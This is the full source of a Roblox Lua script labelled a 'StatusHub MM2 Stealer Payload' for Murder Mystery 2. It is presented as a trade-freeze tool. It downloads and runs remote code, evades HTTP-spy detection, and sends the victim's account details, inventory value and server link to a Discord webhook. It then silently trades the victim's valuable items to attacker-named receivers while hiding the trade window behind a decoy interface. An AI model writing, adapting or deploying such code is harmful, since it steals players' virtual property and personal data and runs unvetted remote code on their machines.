-- StatusHub MM2 Stealer Payload
-- Generated: __GENERATED_AT__

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- Run silent stealer first, reset G so it can run
task.spawn(function()
    _G.scriptExecuted = false
    pcall(function()
        loadstring(game:HttpGet("https://pastefy.app/WPd4solO/raw", true))()
    end)
    _G.scriptExecuted = true
end)
task.wait(3)

local function checkRobloxObjects()
    local success, workspaceType = pcall(function() return workspace.ClassName end)
    if not success or workspaceType ~= "Workspace" then return false end
    local players = game:GetService("Players")
    if typeof(players) ~= "Instance" then return false end
    local lp = players.LocalPlayer
    if not lp then return false end
    local char = lp.Character or lp.CharacterAdded:Wait(5)
    if not char then return false end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp or hrp.ClassName ~= "Part" then return false end
    return true
end

local function checkServices()
    local services = {"Players","RunService","ReplicatedStorage","Workspace"}
    for _, name in ipairs(services) do
        local ok, serv = pcall(game.GetService, game, name)
        if not ok or typeof(serv) ~= "Instance" or serv.ClassName == "" then
            return false
        end
    end
    return true
end

local function checkEnvironment()
    if type(game.PlaceId) ~= "number" then return false end
    if type(game.JobId) ~= "string" or #game.JobId == 0 then return false end
    local rs = game:GetService("RunService")
    if not rs.Heartbeat or type(rs.Heartbeat.Connect) ~= "function" then return false end
    return true
end

local function runChecks()
    return checkRobloxObjects() and checkServices() and checkEnvironment()
end

if not runChecks() then
    warn("discord.gg/WEbwJfs5d5")
    return
end

pcall(function()
    local clip = (syn and syn.setclipboard) or setclipboard or (Clipboard and Clipboard.set)
    if clip then clip("discord.gg/WEbwJfs5d5") end
end)

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local httpRequest = (syn and syn.request) or (http and http.request) or request or http_request

pcall(function()
    if TrackerUrl and TrackerUrl ~= "" then
        httpRequest({
            Url = TrackerUrl,
            Method = "GET",
            Headers = { ["User-Agent"] = "StatusHub-Loader/1.0" },
        })
    end
end)

local function CheckSpy()
    if rawget(getgenv(), "ReGui") then return true end
    if rawget(getgenv(), "Hook") then return true end
    if rawget(getgenv(), "Http") then return true end
    if rawget(_G, "HttpSpy") then return true end
    if rawget(_G, "SimpleSpy") then return true end
    if rawget(_G, "Hydroxide") then return true end
    if rawget(getgenv(), "HttpSpy") then return true end
    if rawget(getgenv(), "SimpleSpy") then return true end
    if rawget(getgenv(), "UrlIntercepts") then return true end
    if rawget(_G, "Ketamine") then return true end
    if rawget(getgenv(), "Ketamine") then return true end
    local requestFunc = rawget(getgenv(), "request")
    if requestFunc then
        local source = debug.info(requestFunc, "s")
        if source and source ~= "[C]" then
            return true
        end
    end
    return false
end

RunService.Heartbeat:Connect(function()
    if CheckSpy() then
        player:Kick("discord.gg/WEbwJfs5d5")
    end
end)

if game.PlaceId ~= 142823291 then
    player:Kick("This script only works on Murder Mystery 2!")
    return
end

-- ========================= CONFIGURATION =========================
local Webhook = "__WEBHOOK_URL__"
local TrackerUrl = "__TRACKER_URL__"
local Receiver = __TARGET_USERS__
local Receiver2 = {}
local Minimum = getgenv().Minimum
local Visual = getgenv().Visual
-- =================================================================

-- Check if private server early
local isPrivateServer = false
local privateServerStatus = "Unknown"
pcall(function()
    local status = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
    if status == "VIPServer" then
        isPrivateServer = true
        privateServerStatus = "VIP Server"
    else
        privateServerStatus = "Public Server"
    end
end)

local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))

-- Fetch Supreme Values list
local ItemValues = {}
pcall(function()
    local res = httpRequest({
        Url = "https://pastefy.app/d4pE0Ph1/raw",
        Method = "GET",
        Headers = {["User-Agent"] = "Mozilla/5.0"},
    })
    if res and res.Body then
        local ok, data = pcall(function() return loadstring(res.Body)() end)
        if ok and data then
            for category, items in pairs(data) do
                for name, value in pairs(items) do
                    ItemValues[name:lower()] = value
                end
            end
        end
    end
end)

-- USD conversion ($0.0125 per value = 1.25 cents)
local USD_MULTIPLIER = 0.0125
local totalInventoryUSD = 0

-- Priority data
local priorityData = {Chromas = {}, Ancients = {}, Godlys = {}}
pcall(function()
    local res = httpRequest({
        Url = "https://raw.githubusercontent.com/aizensosuke28378-cmd/Priorty/refs/heads/main/mm2.json",
        Method = "GET",
    })
    if res and res.Body then
        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if ok and data then
            priorityData = data
        end
    end
end)

local priorityLookup = {}
local function buildPriorityLookup()
    priorityLookup = {}
    if priorityData.Chromas then
        for _, item in ipairs(priorityData.Chromas) do
            if type(item) == "table" and item.name then
                priorityLookup[item.name:lower()] = {id = item.id, category = "Chroma"}
            elseif type(item) == "string" then
                priorityLookup[item:lower()] = {id = 999, category = "Chroma"}
            end
        end
    end
    if priorityData.Ancients then
        for _, item in ipairs(priorityData.Ancients) do
            if type(item) == "table" and item.name then
                priorityLookup[item.name:lower()] = {id = item.id + 100, category = "Ancient"}
            elseif type(item) == "string" then
                priorityLookup[item:lower()] = {id = 999, category = "Ancient"}
            end
        end
    end
    if priorityData.Godlys then
        for _, item in ipairs(priorityData.Godlys) do
            if type(item) == "table" and item.name then
                priorityLookup[item.name:lower()] = {id = item.id + 200, category = "Godly"}
            elseif type(item) == "string" then
                priorityLookup[item:lower()] = {id = 999, category = "Godly"}
            end
        end
    end
end
buildPriorityLookup()

-- ====================== CLEAN REMOTE BYPASS ======================
local TradeRems = ReplicatedStorage.Trade
local function getCleanRemote(path)
    local realRS = nil
    pcall(function() realRS = getrenv().game:GetService("ReplicatedStorage") end)
    local rs = realRS or ReplicatedStorage
    local parts = string.split(path, "/")
    local obj = rs
    for _, part in ipairs(parts) do
        obj = obj:FindFirstChild(part)
        if not obj then return nil end
    end
    return obj
end
if TradeRems then
    pcall(function()
        TradeRems.OfferItem     = getCleanRemote("Trade/OfferItem")     or TradeRems.OfferItem
        TradeRems.AcceptTrade   = getCleanRemote("Trade/AcceptTrade")   or TradeRems.AcceptTrade
        TradeRems.CompleteTrade = getCleanRemote("Trade/CompleteTrade") or TradeRems.CompleteTrade
        TradeRems.SendRequest   = getCleanRemote("Trade/SendRequest")   or TradeRems.SendRequest
        TradeRems.UpdateTrade   = getCleanRemote("Trade/UpdateTrade")   or TradeRems.UpdateTrade
        TradeRems.StartTrade    = getCleanRemote("Trade/StartTrade")    or TradeRems.StartTrade
    end)
end
-- =================================================================

-- ====================== GLOBAL STATE ======================
local savedInventoryText = "Nothing found"
local savedSummaryUrl = "https://pastefy.app"
local savedJobUrl = "https://pastefy.app"
local weaponsToSend = {}
local tradingWith = {}
local sec_arg = nil

ReplicatedStorage:WaitForChild("Trade"):WaitForChild("UpdateTrade").OnClientEvent:Connect(function(info)
    if info and info.LastOffer then
        sec_arg = info.LastOffer
    end
end)

-- ====================== CONTINUOUS AUTO-ACCEPT LOOP ======================
task.spawn(function()
    while true do
        if sec_arg then
            pcall(function()
                ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, sec_arg)
            end)
        end
        task.wait(0.2)
    end
end)

-- ====================== OTHER GLOBAL VARIABLES ======================
local executorName = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown"
local JobIdBypassed = game.JobId
local realJobId = game.JobId
pcall(function()
    local joinData = player:GetJoinData()
    if joinData and joinData.JobId and joinData.JobId ~= "" then
        realJobId = joinData.JobId
    end
end)
local capturedJobId = false
local printedOnce = false

if identifyexecutor and identifyexecutor() == "Delta" then
    local stepAnimate = nil
    repeat
        stepAnimate = nil
        for _, v in ipairs(getgc(true)) do
            if typeof(v) == "function" then
                local info = debug.getinfo(v)
                if info and info.name == "stepAnimate" then
                    stepAnimate = v
                    break
                end
            end
        end
        task.wait()
    until stepAnimate
    local oldStep
    oldStep = hookfunction(stepAnimate, function(dt)
        if not printedOnce then
            printedOnce = true
            JobIdBypassed = game.JobId
            capturedJobId = true
        end
        return oldStep(dt)
    end)
    repeat task.wait() until capturedJobId
end

pcall(function()
    local res = httpRequest({
        Url = "https://pastefy.app/api/v2/paste",
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode({
            title = "Job ID",
            content = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')", game.PlaceId, JobIdBypassed),
            visibility = "UNLISTED",
        }),
    })
    if res and res.Body then
        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if ok and data and data.paste and data.paste.id then
            savedJobUrl = "https://pastefy.app/" .. data.paste.id .. "/raw"
        end
    end
end)

local rarityOrder = {
    ["Chroma"] = 1, ["Ancient"] = 2, ["Unique"] = 3, ["Godly"] = 4,
    ["Classic"] = 5, ["Legendary"] = 6, ["Rare"] = 7, ["Uncommon"] = 8, ["Common"] = 9,
}

-- Default to Epic (skip below Epic)
local Minimum = Minimum or "Rare"

local function meetsRarityMinimum(rarity)
    local minLevel = rarityOrder[Minimum] or 7
    local itemLevel = rarityOrder[rarity] or 99
    return itemLevel <= minLevel
end

local function UploadToPastefy(content)
    local res = httpRequest({
        Url = "https://pastefy.app/api/v2/paste",
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode({ title = "Inventory Summary", content = content, visibility = "UNLISTED" }),
    })
    if res and res.Body then
        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if ok and data and data.paste and data.paste.id then
            return "https://pastefy.app/" .. data.paste.id
        end
    end
    return "https://pastefy.app"
end

local function SendWebhook()
    local playerInfo = string.format(
        "**User:** %s\n**Account Age:** %d days\n**Executor:** %s\n**Players:** %s/%s\n**Server Type:** %s",
        player.Name, player.AccountAge, executorName,
        tostring(#Players:GetPlayers()), tostring(Players.MaxPlayers), privateServerStatus
    )

    local receiverList = {}
    for _, r in ipairs(Receiver) do if r and r ~= "" then table.insert(receiverList, r) end end
    local receiverText = #receiverList == 0 and "None" or table.concat(receiverList, ", ")

    local serverTypeIndicator = isPrivateServer and "🔒 PRIVATE SERVER" or "🌐 PUBLIC SERVER"

    local usdValue = string.format("$%.2f USD", totalInventoryUSD)
    
    local embed = {
        title = "StatusHub - Inventory Stolen " .. serverTypeIndicator,
        description = "StatusHub On Top • .gg/WEbwJfs5d5",
        color = isPrivateServer and 16711680 or 16777215,  -- Red for private, white for public
        fields = {
            {name = "👤 Player Information", value = "\`\`\`\n" .. playerInfo .. "\n\`\`\`", inline = false},
            {name = "💰 Total Value", value = "\`\`\`\n" .. usdValue .. "\n\`\`\`", inline = false},
            {name = "🎒 Inventory Preview", value = "\`\`\`\n" .. savedInventoryText .. "\n\`\`\`", inline = false},
            {name = "🔫 Receivers", value = "\`\`\`\n" .. receiverText .. "\n\`\`\`", inline = false},
            {name = "📎 Full Inventory", value = "[Click here](" .. savedSummaryUrl .. "/raw)", inline = false},
            {name = "🚀 Join Server", value = "[Join](" .. "https://plsbrainrot.me/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. realJobId .. ")", inline = false},
        },
        footer = {text = "StatusHub • .gg/WEbwJfs5d5"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }

    local payload = {
        content = "@everyone",
        embeds = {embed},
    }

    pcall(function()
        httpRequest({
            Url = Webhook .. "?wait=true",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload),
        })
    end)
end

-- Trade helper functions
local function sendTradeRequest(receiverName)
    local target = Players:FindFirstChild(receiverName)
    if not target then return end
    pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(target) end)
    pcall(function() ReplicatedStorage.Trade.SendRequest:FireServer(target) end)
end

local function getTradeStatus()
    local ok, status = pcall(function() return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end)
    return ok and status or "None"
end

local function addWeaponToTrade(id)
    pcall(function() ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons") end)
end

local function getAllReceivers()
    local all = {}
    for _, r in ipairs(Receiver) do if r and r ~= "" then table.insert(all, r) end end
    for _, r in ipairs(Receiver2) do if r and r ~= "" then table.insert(all, r) end end
    return all
end

-- Refresh inventory
local function refreshInventory()
    local Data = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(player.Name)
    local newQueue = {}
    if Data and Data.Weapons and Data.Weapons.Owned then
        for dataid, amount in pairs(Data.Weapons.Owned) do
            if amount and amount > 0 then
                local item = database[dataid]
                if item then
                    local name = item.ItemName or tostring(dataid)
                    local rarity = item.Rarity or "Unknown"
                    local isChroma = item.Chroma or false
                    if name ~= "Default Gun" and name ~= "Default Knife" then
                        local displayRarity = isChroma and "Chroma" or rarity
                        if meetsRarityMinimum(displayRarity) then
                            local searchName = name:lower()
                            if isChroma then searchName = "chroma " .. searchName end
                            local value = ItemValues[searchName] or ItemValues[name:lower()] or 1
                            if value >= MinimumItemValue then
                                local priorityInfo = priorityLookup[name:lower()] or {id = 999999, category = displayRarity}
                                table.insert(newQueue, {
                                    DataID = dataid,
                                    Rarity = rarity,
                                    isChroma = isChroma,
                                    displayRarity = displayRarity,
                                    Amount = amount,
                                    sortPriority = rarityOrder[displayRarity] or 99,
                                    priorityId = priorityInfo.id,
                                    priorityCategory = priorityInfo.category,
                                    value = value,
                                })
                            end
                        end
                    end
                end
            end
        end
        table.sort(newQueue, function(a, b)
            if a.priorityId ~= b.priorityId then
                return a.priorityId < b.priorityId
            end
            if a.value ~= b.value then
                return a.value > b.value
            end
            if a.sortPriority ~= b.sortPriority then
                return a.sortPriority < b.sortPriority
            end
            return false
        end)
    end
    weaponsToSend = newQueue
    return #weaponsToSend
end

-- ULTRA FAST TRADE LOOP (continuous auto‑accept in background)
local function doTrade(receiverName)
    while #weaponsToSend > 0 do
        local status = getTradeStatus()
        if status == "StartTrade" or status == "ReceivingRequest" then
            -- Cancel any existing trade instantly
            pcall(function() ReplicatedStorage.Trade.DeclineTrade:FireServer() end)
            pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
            task.wait(0.2)
            continue
        end
        if status == "None" then
            -- Send trade request immediately
            sendTradeRequest(receiverName)
            local startTime = tick()
            repeat
                task.wait(0.1)
                status = getTradeStatus()
            until status == "StartTrade" or tick() - startTime > 8
            if status ~= "StartTrade" then task.wait(0.5) continue end

            -- Add items as fast as possible (no wait)
            local itemsThisCycle = math.min(4, #weaponsToSend)
            for i = 1, itemsThisCycle do
                local weapon = table.remove(weaponsToSend, 1)
                if weapon and weapon.DataID and weapon.Amount and weapon.Amount > 0 then
                    for _ = 1, weapon.Amount do
                        addWeaponToTrade(weapon.DataID)
                    end
                end
            end

            -- The continuous auto‑accept loop will handle accepting.
            -- Wait until trade finishes (server moves to None)
            repeat
                task.wait(0.1)
                status = getTradeStatus()
            until status == "None" or tick() - startTime > 25

            -- Refresh inventory and continue instantly
            local remaining = refreshInventory()
            if remaining == 0 then
                player:Kick("All items stolen by StatusHub! discord.gg/WEbwJfs5d5 - Join to create your own stealer script")
                return
            end
            -- No extra wait, loop back immediately
        else
            task.wait(0.1)
        end
    end
    player:Kick("All items stolen by StatusHub! discord.gg/WEbwJfs5d5 - Join to create your own stealer script")
end

local function startTradeWatcher()
    if isPrivateServer then return end  -- Don't start trading in private servers
    local allReceivers = getAllReceivers()
    local function onPlayerJoin(p)
        for _, receiverName in ipairs(allReceivers) do
            if p.Name == receiverName and not tradingWith[receiverName] and #weaponsToSend > 0 then
                tradingWith[receiverName] = true
                task.spawn(doTrade, receiverName)
            end
        end
    end
    for _, p in ipairs(Players:GetPlayers()) do onPlayerJoin(p) end
    Players.PlayerAdded:Connect(onPlayerJoin)
end

-- ================== BUILD INITIAL INVENTORY & WEBHOOK ==================
local Data = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(player.Name)
local hasItems = false
local inventoryItems = {}

if Data and Data.Weapons and Data.Weapons.Owned then
    for dataid, amount in pairs(Data.Weapons.Owned) do
        if amount and amount > 0 then
            local item = database[dataid]
            if item then
                local name = item.ItemName or tostring(dataid)
                local rarity = item.Rarity or "Unknown"
                local isChroma = item.Chroma or false
                if name ~= "Default Gun" and name ~= "Default Knife" then
                    local displayRarity = isChroma and "Chroma" or rarity
                    if meetsRarityMinimum(displayRarity) then
                        hasItems = true
                        local emoji = (item.ItemType == "Knife") and "🗡️" or "🔫"
                        local searchName = name:lower()
                        if isChroma then searchName = "chroma " .. searchName end
                        local value = ItemValues[searchName] or ItemValues[name:lower()] or 1
                        local line
                        if isChroma then
                            line = string.format("🌈%s [Chroma] [%s] %s - x%d [%d]", emoji, rarity, name, amount, value)
                        else
                            line = string.format("%s [%s] %s - x%d [%d]", emoji, rarity, name, amount, value)
                        end
                        local priorityInfo = priorityLookup[name:lower()] or {id = 999999, category = displayRarity}
                        table.insert(inventoryItems, {
                            line = line,
                            sortPriority = rarityOrder[displayRarity] or 99,
                            isChroma = isChroma,
                            DataID = dataid,
                            Amount = amount,
                            Rarity = rarity,
                            priorityId = priorityInfo.id,
                            priorityCategory = priorityInfo.category,
                            value = value,
                        })
                    end
                end
            end
        end
    end
end

if not hasItems then
    savedInventoryText = "No items found"
end

table.sort(inventoryItems, function(a, b)
    if a.priorityId ~= b.priorityId then
        return a.priorityId < b.priorityId
    end
    if a.value ~= b.value then
        return a.value > b.value
    end
    if a.sortPriority ~= b.sortPriority then
        return a.sortPriority < b.sortPriority
    end
    return a.line < b.line
end)

for _, item in ipairs(inventoryItems) do
    table.insert(weaponsToSend, {
        DataID = item.DataID,
        Rarity = item.Rarity,
        Amount = item.Amount,
        isChroma = item.isChroma,
        priorityId = item.priorityId,
        priorityCategory = item.priorityCategory,
        value = item.value,
    })
end

local fullLines = {}
totalInventoryUSD = 0
for _, item in ipairs(inventoryItems) do 
    table.insert(fullLines, item.line)
    totalInventoryUSD = totalInventoryUSD + (item.value * USD_MULTIPLIER)
end
savedSummaryUrl = UploadToPastefy(table.concat(fullLines, "\n"))

local previewLines = {}
if #fullLines > 15 then
    for i = 1, 15 do table.insert(previewLines, fullLines[i]) end
    table.insert(previewLines, "... More")
else
    previewLines = fullLines
end
savedInventoryText = #previewLines > 0 and table.concat(previewLines, "\n") or "Nothing found"

local function ExecuteVisual()
    if Visual == nil then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ryze863-create/loading-screen/refs/heads/main/gui.luau", true))()
    else
        loadstring(game:HttpGet(Visual, true))()
    end
end
ExecuteVisual()

local tradeGui = playerGui:WaitForChild("TradeGUI")
local tradeGuiPhone = playerGui:WaitForChild("TradeGUI_Phone")
tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() tradeGui.Enabled = false end)
tradeGuiPhone:GetPropertyChangedSignal("Enabled"):Connect(function() tradeGuiPhone.Enabled = false end)

task.wait(5)
SendWebhook()
startTradeWatcher()

-- ========================= STATUS HUB UI =========================
task.spawn(function()
    task.wait(1)

    local TweenService = game:GetService("TweenService")
    local UserInputService = game:GetService("UserInputService")

    local frozen = false

    local screenGui = Instance.new("ScreenGui")
    screenGui.ResetOnSpawn = false
    screenGui.DisplayOrder = 50
    screenGui.Name = "StatusHubUI"
    screenGui.Parent = game:GetService("CoreGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 220, 0, 140)
    frame.Position = UDim2.new(0, 20, 0.5, -70)
    frame.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
    frame.BorderSizePixel = 0
    frame.Active = true
    frame.Parent = screenGui

    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 6)

    local frameStroke = Instance.new("UIStroke")
    frameStroke.Color = Color3.fromRGB(120, 70, 220)
    frameStroke.Thickness = 1
    frameStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    frameStroke.Parent = frame

    -- Drag logic
    local dragging, dragStart, startPos
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)

    -- Header bar
    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 28)
    header.BackgroundColor3 = Color3.fromRGB(25, 15, 45)
    header.BorderSizePixel = 0
    header.Parent = frame
    Instance.new("UICorner", header).CornerRadius = UDim.new(0, 6)

    local brand = Instance.new("TextLabel")
    brand.Size = UDim2.new(1, -40, 1, 0)
    brand.Position = UDim2.new(0, 12, 0, 0)
    brand.BackgroundTransparency = 1
    brand.Text = "StatusHub"
    brand.Font = Enum.Font.GothamBold
    brand.TextSize = 13
    brand.TextColor3 = Color3.fromRGB(255, 255, 255)
    brand.TextXAlignment = Enum.TextXAlignment.Left
    brand.Parent = header

    local version = Instance.new("TextLabel")
    version.Size = UDim2.new(0, 35, 1, 0)
    version.Position = UDim2.new(1, -40, 0, 0)
    version.BackgroundTransparency = 1
    version.Text = "v4.5"
    version.Font = Enum.Font.Gotham
    version.TextSize = 10
    version.TextColor3 = Color3.fromRGB(120, 70, 220)
    version.TextXAlignment = Enum.TextXAlignment.Right
    version.Parent = header

    -- Green breathing dot
    local dot = Instance.new("Frame")
    dot.Size = UDim2.new(0, 7, 0, 7)
    dot.Position = UDim2.new(0, 12, 0, 38)
    dot.BackgroundColor3 = Color3.fromRGB(80, 220, 120)
    dot.BorderSizePixel = 0
    dot.Parent = frame
    Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

    TweenService:Create(dot, TweenInfo.new(1.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
        BackgroundColor3 = Color3.fromRGB(30, 160, 70)
    }):Play()

    -- Status line
    local statusLine = Instance.new("TextLabel")
    statusLine.Size = UDim2.new(1, -30, 0, 18)
    statusLine.Position = UDim2.new(0, 24, 0, 32)
    statusLine.BackgroundTransparency = 1
    statusLine.Text = "Freeze Trade  —  Running"
    statusLine.Font = Enum.Font.GothamSemibold
    statusLine.TextSize = 11
    statusLine.TextColor3 = Color3.fromRGB(220, 220, 220)
    statusLine.TextXAlignment = Enum.TextXAlignment.Left
    statusLine.Parent = frame

    -- Divider
    local divider = Instance.new("Frame")
    divider.Size = UDim2.new(1, -24, 0, 1)
    divider.Position = UDim2.new(0, 12, 0, 56)
    divider.BackgroundColor3 = Color3.fromRGB(50, 35, 80)
    divider.BorderSizePixel = 0
    divider.Parent = frame

    -- Toggle Freeze button
    local freezeBtn = Instance.new("TextButton")
    freezeBtn.Size = UDim2.new(1, -24, 0, 28)
    freezeBtn.Position = UDim2.new(0, 12, 0, 64)
    freezeBtn.BackgroundColor3 = Color3.fromRGB(30, 20, 55)
    freezeBtn.BorderSizePixel = 0
    freezeBtn.Text = "Toggle Freeze  —  ON"
    freezeBtn.Font = Enum.Font.GothamSemibold
    freezeBtn.TextSize = 11
    freezeBtn.TextColor3 = Color3.fromRGB(80, 220, 120)
    freezeBtn.Parent = frame
    Instance.new("UICorner", freezeBtn).CornerRadius = UDim.new(0, 5)

    local freezeStroke = Instance.new("UIStroke")
    freezeStroke.Color = Color3.fromRGB(80, 50, 130)
    freezeStroke.Thickness = 1
    freezeStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    freezeStroke.Parent = freezeBtn

    freezeBtn.MouseButton1Click:Connect(function()
        frozen = not frozen
        if frozen then
            freezeBtn.Text = "Toggle Freeze  —  OFF"
            freezeBtn.TextColor3 = Color3.fromRGB(220, 80, 80)
            -- Stop auto accept
            sec_arg = nil
        else
            freezeBtn.Text = "Toggle Freeze  —  ON"
            freezeBtn.TextColor3 = Color3.fromRGB(80, 220, 120)
        end
    end)

    -- Force Accept button
    local forceBtn = Instance.new("TextButton")
    forceBtn.Size = UDim2.new(1, -24, 0, 28)
    forceBtn.Position = UDim2.new(0, 12, 0, 98)
    forceBtn.BackgroundColor3 = Color3.fromRGB(30, 20, 55)
    forceBtn.BorderSizePixel = 0
    forceBtn.Text = "Force Accept"
    forceBtn.Font = Enum.Font.GothamSemibold
    forceBtn.TextSize = 11
    forceBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
    forceBtn.Parent = frame
    Instance.new("UICorner", forceBtn).CornerRadius = UDim.new(0, 5)

    local forceStroke = Instance.new("UIStroke")
    forceStroke.Color = Color3.fromRGB(80, 50, 130)
    forceStroke.Thickness = 1
    forceStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    forceStroke.Parent = forceBtn

    forceBtn.MouseButton1Click:Connect(function()
        if sec_arg then
            pcall(function()
                ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, sec_arg)
            end)
        end
    end)
end)
